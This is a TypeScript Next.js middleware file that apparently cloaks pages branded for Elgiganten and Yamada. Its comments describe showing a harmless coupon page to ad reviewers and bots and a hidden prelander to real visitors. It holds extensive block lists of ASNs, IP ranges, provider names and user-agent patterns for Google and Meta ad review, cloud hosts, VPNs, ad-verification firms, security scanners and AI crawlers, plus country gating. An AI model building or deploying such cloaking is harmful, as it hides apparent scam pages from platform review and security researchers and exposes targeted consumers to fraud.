// middleware.ts
import { NextResponse, NextRequest } from "next/server";

export const config = {
  matcher: ["/elgiganten/verify/:path*", "/yamada", "/yamada/verify/:path*", "/yamada/lander/:path*"],
};

/* ========= RUNTIME CONFIG / LOGGING ========= */
function getRedirectUrl(pathname: string): string {
  if (pathname.startsWith("/yamada")) return "/yamada";
  return "https://www.elgiganten.se";
}
const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0";
const log = (...args: any[]) => VERBOSE && console.log("[MW]", ...args);

/* ========= Provider blocklists (ASN + name/domain snippets) ========= */
const BAD_ASN = new Set<string>([
  // Google
  "AS15169", "AS396982", "AS36384", "AS19527",
  // Cloudflare
  "AS13335", "AS209242",
  // Amazon / AWS
  "AS16509", "AS14618", "AS7224", "AS8987", "AS38895",
  // Microsoft / Azure / Bing
  "AS8075", "AS8068", "AS8069", "AS12076", "AS3598", "AS200517",
  // Meta / Facebook
  "AS32934", "AS54115", "AS34825", "AS149642", "AS63293",
  // Fastly
  "AS54113",
  // Akamai
  "AS20940", "AS16625", "AS16702", "AS35994", "AS32787", "AS63949",
  // TikTok / ByteDance
  "AS396986", "AS138699", "AS132203",
  // Oracle Cloud
  "AS31898", "AS20473",
  // DigitalOcean
  "AS14061", "AS393406",
  // Hetzner
  "AS24940", "AS213230",
  // OVH
  "AS16276",
  // Alibaba Cloud
  "AS45102", "AS37963", "AS45104",
  // Tencent Cloud
  "AS132203", "AS45090", "AS134761",
  // Scaleway / Online.net
  "AS12876",
  // Kamatera
  "AS36007",
  // UpCloud
  "AS202053",
  // Ionos / 1&1
  "AS8560",
  // Hostinger
  "AS47583",
  // Fly.io
  "AS40509",
  // Render
  "AS397942",
  // Railway
  "AS399820",
  // VPN / Proxy providers
  "AS9009",   // M247 (NordVPN, Surfshark, etc.)
  "AS60068",  // CDN77
  "AS20473",  // Vultr (also used by VPNs)
  "AS212238", // Datacamp (proxy provider)
  "AS62785",  // Private Internet Access
  "AS396356", // Maxihost
  "AS174",    // Cogent (many proxies)
  "AS49981",  // WorldStream
  "AS30633",  // Leaseweb
  "AS51167",  // Contabo
  "AS62563",  // GTHost
  "AS209103", // OVH alt
  "AS208091",
  // Zscaler / Corporate proxies
  "AS22616",  // Zscaler
  "AS62044",  // Zscaler alt
  // Extras
  "AS36040", "AS139070", "AS36561", "AS43515", "AS16550",
  "AS13443", "AS14413", "AS40793",
  "AS19047", "AS36263", "AS12222",
  "AS13949", "AS22859", "AS36492", "AS394089", "AS40873", "AS139190",
  "AS396507", "AS32613", "AS59253",
  // China Telecom/Unicom/Mobile
  "AS4134", "AS4837", "AS9808", "AS17816", "AS17974",
]);

const BAD_NAME_SNIPPETS: string[] = [
  "google", "google llc", "google cloud", "google ireland limited", "googleusercontent.com",
  "1e100.net", "gvt1.com", "google.com", "youtube", "ggc", "googlebot",
  "meta", "meta platforms", "facebook", "facebook inc", "fb.com", "instagram", "whatsapp",
  "oculus", "threads", "facebook.com", "instagram.com", "meta.com",
  "microsoft", "microsoft corporation", "azure", "windows.net", "bing", "msn",
  "linkedin", "linkedin corporation", "microsoft.com", "azure.com", "linkedin.com",
  "amazon", "amazon technologies", "amazon web services", "aws", "amazonaws.com", "cloudfront.net",
  "cloudflare", "cloudflare, inc", "cloudflare.com",
  "akamai", "akamai technologies", "akamai international", "akamaiedge.net",
  "akamaitechnologies.com", "akamai.com", "prolexic",
  "fastly", "fastly, inc", "fastly.com", "fastly.net",
  "linode", "linode, llc", "linode.com",
  "tiktok", "bytedance", "bytecdn", "byteoversea",
  "digitalocean", "do-user", "digital ocean",
  "hetzner", "hetzner online",
  "ovh", "ovh sas", "ovhcloud",
  "oracle", "oracle cloud", "oracle corporation",
  "alibaba", "aliyun", "alibaba cloud",
  "tencent", "tencent cloud", "qcloud",
  "datacamp", "dataprovider", 
  "m247", "choopa", "quadranet", "leaseweb",
  "colo", "contabo", "vultr", "stackpath", "zenlayer",
  "bright data", "luminati", "brightdata", "luminati networks",
  "oxylabs", "smartproxy", "cdn77",
  // Hosting / Cloud / VPS
  "scaleway", "online.net", "kamatera", "upcloud", "hostinger",
  "ionos", "1and1", "1&1", "fly.io", "render.com", "railway",
  "godaddy", "namecheap", "hostgator", "bluehost", "siteground",
  "dreamhost", "rackspace", "softlayer", "ibm cloud",
  "worldstream", "maxihost", "serverion", "nforce",
  // VPN / Proxy / Privacy
  "nordvpn", "expressvpn", "surfshark", "cyberghost", "private internet access",
  "protonvpn", "proton vpn", "mullvad", "ipvanish", "tunnelbear",
  "windscribe", "strongvpn", "hide.me", "purevpn", "hotspot shield",
  "zscaler", "forcepoint", "netskope", "palo alto", "fortinet",
  "cisco umbrella", "umbrella", "proxy", "vpn", "anonymizer",
  "tor exit", "tor project",
  // Ad verification / Security scanning
  "geoedge", "confiant", "doubleverify", "integral ad science",
  "the media trust", "adloox", "forensiq", "pixalate", "moat",
  "grapeshot", "comscore", "nielsen", "white ops", "human security",
  // ISP extras
  "triple t broadband public company limited", "triple t broadband", "3bb",
  "cogent", "he.net", "hurricane electric",
];

/* ======= ENV-driven extensions ======= */
if (process.env.BLOCKED_ASNS) {
  for (const asn of process.env.BLOCKED_ASNS.split(",")) {
    const v = asn.trim().toUpperCase();
    if (v) BAD_ASN.add(v);
  }
}
if (process.env.BLOCKED_ISP_SUBSTRS) {
  for (const s of process.env.BLOCKED_ISP_SUBSTRS.split(",")) {
    const v = s.trim().toLowerCase();
    if (v) BAD_NAME_SNIPPETS.push(v);
  }
}

/** Country rules */
const ALLOWED_COUNTRIES = new Set(
  (process.env.ALLOWED_COUNTRIES || process.env.ALLOWED_COUNTRY || "")
    .split(",")
    .map((c) => c.trim().toUpperCase())
    .filter(Boolean)
);

const BAD_COUNTRIES = new Set<string>(
  (process.env.BLOCKED_COUNTRY_CODES || "")
    .split(",")
    .map((c) => c.trim().toUpperCase())
    .filter(Boolean)
);

function isBlockedByCountry(arg: { code?: string; name?: string }) {
  const code = (arg.code || "").toUpperCase();
  const name = (arg.name || "").toUpperCase();

  if (ALLOWED_COUNTRIES.size > 0) {
    const fallback =
      name === "SWEDEN" ? "SE" :
      //name === "ROMANIA" ? "RO" :
      name === "JAPAN" ? "JP" :
      name === "THAILAND" ? "TH" :
      "";
    const effective = code || fallback;
    if (!effective) return true;
    return !ALLOWED_COUNTRIES.has(effective);
  }

  const candidate = code || name;
  return candidate ? BAD_COUNTRIES.has(candidate) : false;
}

/* ========= Bot UA detection ========= */
const BOT_UA =
  /(bot|tencent|crawler|spider|crawling|curl|wget|python-requests|python-urllib|httpx|aiohttp|httpclient|libwww|urlgrabber|^python|^php|^java|^ruby|^perl|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|selenium|webdriver|chromedriver|geckodriver|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|adsbot|google-read-aloud|google-cloudvertexbot|google-inspectiontool|google-safety|google-adwords|google-ads|google-site-verification|mediapartners-google|storebot-google|apis-google|feedfetcher-google|bingbot|bingpreview|msnbot|adidxbot|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot|gptbot|chatgpt|openai|claudebot|claude-web|anthropic|perplexity|cohere-ai|bytespider|bytedance|iaskspider|ccbot|facebook\.com|meta-externalagent|meta-externalfetcher|google-extended|diffbot|archive\.org|commoncrawl|newspaper|httrack|nutch|linkdex|rogerbot|blexbot|sitebulb|screaming frog|deepcrawl|lumar|oncrawl|netcraft|censys|shodan|zoomeye|nmap|masscan|zgrab|nuclei|nikto|wpscan|sqlmap|nessus|qualys|rapid7|acunetix|burpsuite|zap|owasp|dirbuster|gobuster|feroxbuster|whatweb|wapiti|skipfish)/i;

/* ========= CIDR check (ported from guard.php) ========= */
const BAD_CIDR = [
  // Google (crawlers, ads review, cloud)
  "8.8.8.0/24", "8.8.4.0/24",
  "142.250.0.0/15", "172.217.0.0/16",
  "74.125.0.0/16", "66.249.64.0/19", "64.233.160.0/19",
  "209.85.128.0/17", "216.239.32.0/19", "216.58.192.0/19",
  "108.177.0.0/17", "173.194.0.0/16",
  // Google Cloud
  "34.64.0.0/10", "34.128.0.0/10",
  "35.184.0.0/13", "35.192.0.0/11", "35.224.0.0/12", "35.240.0.0/13",
  "104.196.0.0/14",
  // Google Ads Review specific
  "66.249.64.0/19", "66.249.80.0/20",
  "72.14.192.0/18",
  // Meta / Facebook
  "31.13.24.0/21", "31.13.64.0/18",
  "66.220.144.0/20", "69.63.176.0/20", "69.171.224.0/19",
  "157.240.0.0/16", "173.252.64.0/18", "204.15.20.0/22", "103.4.96.0/22",
  "129.134.0.0/16", "185.60.216.0/22",
  // Microsoft / Bing Ads
  "13.64.0.0/11", "13.96.0.0/13", "13.104.0.0/14",
  "20.0.0.0/11", "20.33.0.0/16", "20.34.0.0/15",
  "40.64.0.0/10", "52.96.0.0/12",
  "65.52.0.0/14", "70.37.0.0/17",
  "104.40.0.0/13", "104.208.0.0/13",
  "131.253.0.0/16", "199.30.16.0/20",
  "207.46.0.0/16", "207.68.128.0/18",
  // AWS (common ranges)
  "54.80.0.0/12", "52.0.0.0/11",
  "3.0.0.0/9", "18.0.0.0/11",
  "54.64.0.0/11", "54.128.0.0/12",
  // Twitter / X
  "206.130.0.0/16", "192.243.60.0/22",
  "66.135.0.0/16", "199.16.156.0/22",
  "199.59.148.0/22", "104.244.40.0/21",
  // Cloudflare
  "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
  "104.16.0.0/13", "104.24.0.0/14",
  "108.162.192.0/18", "131.0.72.0/22",
  "141.101.64.0/18", "162.158.0.0/15",
  "172.64.0.0/13", "173.245.48.0/20",
  "188.114.96.0/20", "190.93.240.0/20",
  "197.234.240.0/22", "198.41.128.0/17",
];

function ipToLong(ip: string): number {
  const parts = ip.split(".").map(Number);
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

function isBlockedCidr(ip: string): boolean {
  const ipLong = ipToLong(ip);
  for (const cidr of BAD_CIDR) {
    const [subnet, bitsStr] = cidr.split("/");
    const bits = parseInt(bitsStr);
    const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
    if ((ipToLong(subnet) & mask) === (ipLong & mask)) return true;
  }
  return false;
}

/* ========= Header sanity (ported from guard.php) ========= */
function hasSuspiciousHeaders(req: NextRequest): boolean {
  const ua = req.headers.get("user-agent") || "";
  const acceptLang = req.headers.get("accept-language") || "";
  if (!ua) return true;
  if (!acceptLang || acceptLang.trim().length < 2) return true;
  return false;
}

/* ========= Proxy header detection ========= */
const PROXY_HEADERS = [
  "via", "x-proxy-id", "proxy-connection", "x-proxy-connection",
  "x-originating-ip", "x-remote-addr", "x-remote-ip",
];
function hasProxyHeaders(req: NextRequest): string | null {
  for (const h of PROXY_HEADERS) {
    const val = req.headers.get(h);
    if (val) return h;
  }
  return null;
}

/* ========= Accept header anomaly ========= */
function hasSuspiciousAccept(req: NextRequest): boolean {
  const accept = req.headers.get("accept") || "";
  // Missing accept header entirely or just "*/*" (no text/html) for page requests
  if (!accept) return true;
  if (accept === "*/*" && !accept.includes("text/html")) return true;
  return false;
}

/* ========= Helpers ========= */
function getClientIp(req: NextRequest): string | null {
  const fwd = req.headers.get("x-forwarded-for");
  if (fwd) {
    const ip = fwd.split(",")[0]?.trim();
    if (ip) return ip;
  }
  const cf = req.headers.get("cf-connecting-ip");
  if (cf) return cf.trim();
  const xr = req.headers.get("x-real-ip");
  if (xr) return xr.trim();
  return null;
}

async function ipinfoLookup(ip: string, token?: string) {
  if (!token) {
    log("No IPINFO_TOKEN; skipping IPinfo.");
    return null;
  }
  const url = `https://api.ipinfo.io/lite/${encodeURIComponent(ip)}?token=${encodeURIComponent(token)}`;
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    log("IPinfo query:", ip);
    const res = await fetch(url, { signal: controller.signal, cache: "no-store" });
    clearTimeout(to);
    if (!res.ok) {
      log("IPinfo non-OK:", res.status, res.statusText);
      return null;
    }
    const json = (await res.json()) as {
      asn?: string;
      as_name?: string;
      as_domain?: string;
      country?: string;
      country_code?: string;
    };
    log("IPinfo response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("IPinfo error:", e);
    return null;
  }
}

function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain?: string } | null): { blocked: boolean; type?: string; match?: string } {
  if (!rec) return { blocked: false };
  const { asn, as_name, as_domain } = rec;
  if (asn && BAD_ASN.has(asn.toUpperCase())) {
    log("Block by ASN:", asn);
    return { blocked: true, type: "bad_asn", match: asn.toUpperCase() };
  }
  const name = (as_name || "").toLowerCase();
  const domain = (as_domain || "").toLowerCase();
  const hit = BAD_NAME_SNIPPETS.find((n) => name.includes(n) || domain.includes(n));
  if (hit) {
    log(`Block by ISP substring: "${hit}" in name="${name}" domain="${domain}"`);
    return { blocked: true, type: "bad_name_snippet", match: hit };
  }
  return { blocked: false };
}

async function maxmindLookup(req: NextRequest, ip: string) {
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    const url = new URL("/api/isp-lookup", req.nextUrl.origin);
    url.searchParams.set("ip", ip);
    log("MaxMind check:", url.toString());
    const res = await fetch(url.toString(), {
      method: "GET",
      signal: controller.signal,
      headers: { "x-mw": "1" },
      cache: "no-store",
    });
    clearTimeout(to);
    if (!res.ok) {
      log("MaxMind non-OK:", res.status);
      return null;
    }
    const json = (await res.json()) as { isBad?: boolean; reason?: string; isp?: string; asn?: string };
    log("MaxMind response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("MaxMind error:", e);
    return null;
  }
}

/* ========= Guard result type ========= */
interface GuardResult {
  blocked: boolean;
  reason: string;
  checks: Record<string, string>;
  country?: string;
  countryCode?: string;
  asn?: string;
  isp?: string;
}

/* ========= Guard: full check ========= */
async function runGuard(req: NextRequest, ip: string | null): Promise<GuardResult> {
  const ua = req.headers.get("user-agent") || "";
  const checks: Record<string, string> = {};

  // 1. Bot UA
  const botMatch = BOT_UA.test(ua);
  checks["bot_ua"] = botMatch ? "BLOCKED" : "pass";
  if (botMatch) {
    log("Guard: block by bot UA");
    return { blocked: true, reason: "bot_ua", checks };
  }

  // 2. Header sanity
  const suspHeaders = hasSuspiciousHeaders(req);
  checks["headers"] = suspHeaders ? "BLOCKED" : "pass";
  if (suspHeaders) {
    log("Guard: block by suspicious headers");
    return { blocked: true, reason: "suspicious_headers", checks };
  }

  // 2b. Proxy headers
  const proxyHeader = hasProxyHeaders(req);
  checks["proxy_headers"] = proxyHeader ? `BLOCKED (${proxyHeader})` : "pass";
  if (proxyHeader) {
    log("Guard: block by proxy header:", proxyHeader);
    return { blocked: true, reason: `proxy_header:${proxyHeader}`, checks };
  }

  // 2c. Accept header anomaly
  const suspAccept = hasSuspiciousAccept(req);
  checks["accept_header"] = suspAccept ? "BLOCKED" : "pass";
  if (suspAccept) {
    log("Guard: block by suspicious accept header");
    return { blocked: true, reason: "suspicious_accept", checks };
  }

  if (!ip) {
    checks["ip"] = "BLOCKED (missing)";
    log("Guard: block — no IP");
    return { blocked: true, reason: "no_ip", checks };
  }
  checks["ip"] = "present";

  // 3. CIDR
  const cidrBlocked = isBlockedCidr(ip);
  checks["cidr"] = cidrBlocked ? "BLOCKED" : "pass";
  if (cidrBlocked) {
    log("Guard: block by CIDR:", ip);
    return { blocked: true, reason: "cidr", checks };
  }

  // 4. IPinfo
  const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
  checks["ipinfo"] = lite ? "fetched" : "failed/skipped";

  const asn = lite?.asn || "";
  const ispName = (lite as any)?.as_name || "";
  const countryCode = (lite as any)?.country_code || "";
  const country = lite?.country || "";

  // 5. Provider / ASN
  const providerResult = matchesBadProviderLite(lite);
  checks["provider"] = providerResult.blocked ? `BLOCKED (${providerResult.type}: ${providerResult.match})` : "pass";
  if (providerResult.blocked) {
    const reason = providerResult.type === "bad_asn"
      ? `bad_asn:${providerResult.match}`
      : `bad_name_snippet:${providerResult.match}`;
    log("Guard: block by provider —", reason);
    return { blocked: true, reason, checks, asn, isp: ispName, countryCode, country };
  }

  // 6. Country
  const countryBlocked = lite && isBlockedByCountry({ code: countryCode, name: country });
  const noCountry = ALLOWED_COUNTRIES.size > 0 && (!lite || (!countryCode && !country));
  checks["country"] = countryBlocked ? "BLOCKED" : noCountry ? "BLOCKED (missing)" : "pass";
  if (countryBlocked) {
    log("Guard: block by country");
    return { blocked: true, reason: "country", checks, asn, isp: ispName, countryCode, country };
  }
  if (noCountry) {
    log("Guard: block — no country while allow-only active");
    return { blocked: true, reason: "country_missing", checks, asn, isp: ispName };
  }

  // 7. MaxMind
  const mm = await maxmindLookup(req, ip);
  checks["maxmind"] = mm?.isBad ? "BLOCKED" : mm ? "pass" : "failed/skipped";
  if (mm?.isBad) {
    log("Guard: block by MaxMind:", mm.reason);
    return { blocked: true, reason: `maxmind:${mm.reason || "bad"}`, checks, asn, isp: mm.isp || ispName, countryCode, country };
  }

  return { blocked: false, reason: "allowed", checks, asn, isp: ispName, countryCode, country };
}

/* ========= Fire-and-forget shield log ========= */
function sendShieldLog(req: NextRequest, entry: Record<string, any>) {
  try {
    const url = new URL("/api/shield-log", req.nextUrl.origin);
    fetch(url.toString(), {
      method: "POST",
      headers: { "content-type": "application/json", "x-mw": "1" },
      body: JSON.stringify(entry),
    }).catch(() => {});
  } catch {}
}

/* ========= Middleware ========= */
export async function middleware(req: NextRequest) {
  const pathname = req.nextUrl.pathname;
  const ua = req.headers.get("user-agent") || "";
  const ip = getClientIp(req);
  log("— MW START —", { path: pathname, ip, ua });

  // ──────────────────────────────────────────────────────────────────────
  // /yamada (exact) — CLOAKING: guard decides which page to show
  //   blocked (bot/reviewer) → NextResponse.next() → page.tsx (safe coupon page)
  //   real user              → rewrite to /yamada/lander/ → index2.html (prelander)
  //   URL always stays discountnation.online/yamada
  // ──────────────────────────────────────────────────────────────────────
  if (pathname === "/yamada" || pathname === "/yamada/") {
    const guard = await runGuard(req, ip);
    const verdict = guard.blocked ? "blocked" : "allowed";
    sendShieldLog(req, {
      ts: Date.now(),
      ip,
      ua,
      path: pathname,
      verdict,
      reason: guard.reason,
      checks: guard.checks,
      country: guard.country || "",
      countryCode: guard.countryCode || "",
      asn: guard.asn || "",
      isp: guard.isp || "",
    });
    if (guard.blocked) {
      log("Guard → show safe page (page.tsx)");
      return NextResponse.next();
    }
    log("Guard → show prelander (rewrite to /yamada/lander/)");
    return NextResponse.rewrite(new URL("/yamada/lander/", req.url));
  }

  // ──────────────────────────────────────────────────────────────────────
  // /yamada/verify/* and /yamada/lander/* — block bots, let real users through
  // ──────────────────────────────────────────────────────────────────────
  if (pathname.startsWith("/yamada/verify") || pathname.startsWith("/yamada/lander")) {
    const REDIRECT_URL = "/yamada";
    const guard = await runGuard(req, ip);
    sendShieldLog(req, {
      ts: Date.now(),
      ip,
      ua,
      path: pathname,
      verdict: guard.blocked ? "blocked" : "allowed",
      reason: guard.reason,
      checks: guard.checks,
      country: guard.country || "",
      countryCode: guard.countryCode || "",
      asn: guard.asn || "",
      isp: guard.isp || "",
    });

    if (guard.blocked) {
      log("Block on sub-route →", REDIRECT_URL);
      return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
    }

    log("Allow through sub-route");
    return NextResponse.next();
  }

  // ──────────────────────────────────────────────────────────────────────
  // /elgiganten/verify/* — existing logic (unchanged)
  // ──────────────────────────────────────────────────────────────────────
  const REDIRECT_URL = getRedirectUrl(pathname);
  const guard = await runGuard(req, ip);
  sendShieldLog(req, {
    ts: Date.now(),
    ip,
    ua,
    path: pathname,
    verdict: guard.blocked ? "blocked" : "allowed",
    reason: guard.reason,
    checks: guard.checks,
    country: guard.country || "",
    countryCode: guard.countryCode || "",
    asn: guard.asn || "",
    isp: guard.isp || "",
  });

  if (guard.blocked) {
    log("Block →", REDIRECT_URL);
    return NextResponse.redirect(REDIRECT_URL, { status: 302 });
  }

  log("Allow through");
  return NextResponse.next();
}
